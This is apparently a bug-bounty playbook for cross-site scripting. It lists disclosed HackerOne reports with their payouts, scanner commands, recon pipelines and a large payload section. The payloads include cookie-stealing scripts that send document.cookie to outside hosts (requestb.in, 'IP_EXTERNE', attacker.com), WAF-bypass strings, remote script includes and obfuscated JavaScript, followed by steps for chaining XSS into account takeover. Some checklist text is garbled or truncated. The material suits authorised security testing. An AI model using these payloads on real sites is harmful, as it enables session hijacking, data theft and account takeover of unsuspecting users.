# Real-World Playbook — XSS (Reflected / Stored / DOM)

**Class:** `xss` · **Coverage-matrix tier:** 0 · **Hunter2:** vuln_scanner.sh (dalfox+xsstrike) · /domxss · tools/dom_xss_harness.py · **Skill:** web2-vuln-classes, client-side-security
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow)

## Why it pays (real bounty signal)
Top disclosed XSS reports peak at **$20,000**. Rewarded across: Basecamp, GitLab, PayPal, Reddit, Shopify, TikTok, Uber, Valve.

## How real hackers found it — top disclosed reports
*(title = the actual technique; open the report for the full PoC)*

- **Bypass for #488147 enables stored XSS on https://paypal.com/signin again** — PayPal, $20,000 · 2682👍 · [510152](https://hackerone.com/reports/510152)
- **Stored XSS on https://paypal.com/signin via cache poisoning** — PayPal, $18,900 · 684👍 · [488147](https://hackerone.com/reports/488147)
- **Stored XSS in markdown via the DesignReferenceFilter** — GitLab, $16,000 · 316👍 · [1212067](https://hackerone.com/reports/1212067)
- **Stored XSS via Kroki diagram** — GitLab, $13,950 · 294👍 · [1731349](https://hackerone.com/reports/1731349)
- **New /add_contacts /remove_contacts quick commands susseptible to XSS from Customer Contact firstname/lastname fields** — GitLab, $13,950 · 92👍 · [1578400](https://hackerone.com/reports/1578400)
- **XSS at jamfpro.shopifycloud.com** — Shopify, $9,400 · 239👍 · [1444682](https://hackerone.com/reports/1444682)
- **XSS in steam react chat client** — Valve, $7,500 · 493👍 · [409850](https://hackerone.com/reports/409850)
- **Stored XSS in developer.uber.com** — Uber, $7,500 · 223👍 · [131450](https://hackerone.com/reports/131450)
- **Stored XSS on any page in most Uber domains** — Uber, $6,000 · 107👍 · [217739](https://hackerone.com/reports/217739)
- **Possibility to inject a malicious JavaScript code in any file on tags.tiqcdn.com results in a stored XSS on any page in most Uber domains** — Uber, $6,000 · 51👍 · [256152](https://hackerone.com/reports/256152)
- **Stored XSS in SVG file as data: url** — Shopify, $5,300 · 150👍 · [1276742](https://hackerone.com/reports/1276742)
- **Stored XSS in /admin/product and /admin/collections** — Shopify, $5,300 · 75👍 · [1147433](https://hackerone.com/reports/1147433)
- **[accounts.reddit.com] Redirect parameter allows for XSS** — Reddit, $5,000 · 394👍 · [1962645](https://hackerone.com/reports/1962645)
- **HEY.com email stored XSS** — Basecamp, $5,000 · 359👍 · [982291](https://hackerone.com/reports/982291)
- **RichText parser vulnerability in scheduled posts allows XSS** — Reddit, $5,000 · 280👍 · [1930763](https://hackerone.com/reports/1930763)
- **Reflected XSS on Pangle Endpoint** — TikTok, $5,000 · 196👍 · [2352968](https://hackerone.com/reports/2352968)
- **Reflected xss in https://sh.reddit.com** — Reddit, $5,000 · 165👍 · [1549206](https://hackerone.com/reports/1549206)
- **XSS on $shop$.myshopify.com/admin/ and partners.shopify.com via whitelist bypass in SVG icon for sales channel applications** — Shopify, $5,000 · 87👍 · [232174](https://hackerone.com/reports/232174)

## Test flow / checklist — do these in order
*(imported from Az0x7/vulnerability-Checklist; run each, mark result in the coverage matrix)*

[ ] Tools
```
https://github.com/DanMcInerney/xsscrapy
https://github.com/s0md3v/XSStrike
# Cross Site Scripting detection suite equipped with parsers
# XSStrike analyses the response with multiple parsers and then crafts payloads
# that are guaranteed to work by context analysis integrated with a fuzzing engine

# Documentation
https://github.com/s0md3v/XSStrike/wiki/Usage

# Classical GET
python xsstrike.py -u "http://example.com/search.php?q=query"

# POST
python xsstrike.py -u "http://example.com/search.php" --data "q=query"

# Path payloads
python xsstrike.py -u "http://example.com/search/form/query" --path

# Crawl and test
python xsstrike.py -u "http://example.com/page.php" --crawl

# Load payloads from file and test them
python3 xsstrike.py -u "http://example.com/page.php?q=query" -f /path/to/file.txt

# Find hidden parameters
python xsstrike.py -u "http://example.com/page.php" --params

```
[ ] automate Rxss 
### method uniq
```
https://github.com/yavolo/eventlistener-xss-recon
```
### first method
```

- collect a sub domain (AssetFinder - SubFinder – Amass – Find-domain - Google Dorking) 
 
- find the number of sub-domains which are active ( `httprobe (Tomnomnom) – HTTPX )  >> cat subdomains.txt | httprobe | tee -a host.txt 

- use your payloads :`` <script/src=//Ǌ.₨></script> 

- your report if not acceptd 

-  cat host.txt | crawler | tee -a endpoint.txt   & cat host.txt | waybackurl | tee -a endpoint.txt 

- After finding all the 50 Lakh endpoint I started to fuzz all the parameters to find xss vulnerability with the help of the tool qsreplace. The command used was: 

      cat endpoint.txt | qsreplace ‘“><img src=x onerror=alert(1)> | tee -a xss_fuzz.txt 

- After executing the command now, I had to check the number of parameters have been reflecting our payload into a plain text weather or not, So I created a tool named FREQ which is also available in my GitHub repo. So, the tool sends multiple requests to the check whether the response containing the payload return us with the affected URLs. The command used to perform this attack was: 

 cat xss_fuzz.txt | freq | tee -a possible_xss.txt 

```

### second method
```
cleanP : github.com/raoufmaklouf/c… 

injectP: github.com/raoufmaklouf/i… 

XSS.yaml : gist.githubusercontent.com/raoufmaklouf/7… 

- single target: `gau target.com | cleanP | injectP 'T%22rSpGeUMo%3E7N' | httpx -ms 'T"rSpGeUMo>7N' | nuclei -t XSS.yaml -o xss.txt 
& 
- cat AllEndPoint.txt | cleanP | injectP 'T%22rSpGeUMo%3E7N' | httpx -ms 'T"rSpGeUMo>7N' | nuclei -t XSS.yaml -o xss.txt 
```

### third method
```
irst of all, I enumerated all subdomains of the target.com with [subfinder](https://github.com/projectdiscovery/subfinder) and 
then subdomain brute-forcing with [knockpy](https://github.com/guelfoweb/knock), 
then I used [waybackurls](https://github.com/tomnomnom/waybackurls) to get parameters to test for XSS and then I used [gf](https://github.com/tomnomnom/gf) to get possible XSS parameters. 
after sorting the URLs I used [KXSS](https://github.com/Emoe/kxss) 
And [Dalfox](https://github.com/hahwul/dalfox). Bad luck I got nothing. 
```

### Four method
```
https://mirror-medium.com/?m=https://medium.com/@c0nqr0r/reading-robots-txt-got-me-4-xss-reports-9fd2234c635f&fbclid=IwAR1Z9wF54pIr0l3uLd9xLxiip3gbiWPDo-CFkNaGtrM7FTrLXDBzfI8pqKw
```

[ ] Tips
```
# If XSS is not executed through the UI, you can try to insert it through the API
# It can then fire on the UI. Many filters are not present like this
```

### Payloads
```
# Document.location
<script>document.location('http://IP_EXTERNE/'+document.cookie)</script>
<script>document.location.href = 'http://requestb.in/XXXXXX?cookies =' + document.cookie;</script>

# Window
<script>window.open("http://monserveur/Cookie="+document.cookie)</script>
<script>window.location='http://monsite.free.fr/script.php?cookies='+(document.cookie);</script>

# Document.write
<script>document.write('<img src="https://requestb.in/xxxxx?cookie="+document.cookie>admin</img>');</script>
admin"></i>)</span><script>document.write("<img src=http://requestb.in/XXXXX?cookie=".concat(encodeURI(document.cookie)).concat("/>"))</script><i>

<script>var xhr = new XMLHttpRequest();xhr.open('POST', 'http://requestb.in/w0sw22w0', true);xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xhr.send(document.cookie);</script>

# alert(1) in JS
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

injecting inside of input tags
<input/onfocus=alert(0) autofocus>
<input/onfocus=alert`0` autofocus>
<input/onfocus=prompt`0` autofocus>
1'"><input/onfocus={alert`1`} autofocus> 
```

```
# WAF Bypass
'';!--"<XSS>=&{()}
<IMG SRC="javascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<svg/onload=(((confirm(1))))>
confirm()
confirm``
(confirm``)
{confirm``}
[confirm``]
(((confirm)))``
co\u006efirm()
new class extends confirm``{}
[8].find(confirm)
[8].map(confirm)
[8].some(confirm)
[8].every(confirm)
[8].filter(confirm)
[8].findIndex(confirm)

# No HTML events
<script>alert(1)//
<script>alert(1)<!--
<script>alert(1)%0A-->
<script src=data:,alert(1)>
<script src=//HOST/FILE>
<script src=https:DOMAIN/FILE>
<svg><script xlink:href=//HOST/FILE>
<svg><script xlink:href=https:DOMAIN/FILE>
<svg><script xlink:href=data:,alert(1)>
<svg/onload=(confirm(1))>
<svg/onload=confirm(1)>

# Stealing the source code without triggering browser restrictions
<svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">

# Non alphanumeric alert() payload
Ð=[],Ř=+!+Ð,ˍ=Ř+Ř+Ř,Š=!!Ð+Ð,Ť=!Ð+Ð,Ǎ=(!Ð+{})[Ř+[+Ð]],Č=(Ð+{})[Ř],Ȟ=Š[Ř],Ě=Š[+Ð],_=Ť[ˍ]+Č+Ȟ+Ě,ǰ=Ð[_]+Ð,š=Ð[Ð]+Ð,Ð[_][Ǎ+Č+(š)[Ř]+Ť[ˍ]+Ě+Ȟ+(š)[+Ð]+Ǎ+Ě+Č+Ȟ](Ť[Ř]+Ť[Ř+Ř]+Š[ˍ]+Ȟ+Ě+ǰ[Ř+[ˍ]]+ǰ[Ř+[ˍ+Ř]])()


```

## Chaining — always ask "what does this unlock?"
- Stored XSS in an admin-viewed field → **admin session/ATO**
- XSS → CSRF-token exfil → state-changing request → ATO
- XSS → read authed API responses (same-origin) → PII/IDOR discovery
- DOM XSS via postMessage / location sink — confirm in a real DOM

## Hunter2 wiring
- **Run:** `vuln_scanner.sh (dalfox+xsstrike) · /domxss · tools/dom_xss_harness.py`
- **Skill:** `web2-vuln-classes, client-side-security`
- **Coverage-matrix tier:** 0 (Tier 0 = test first)
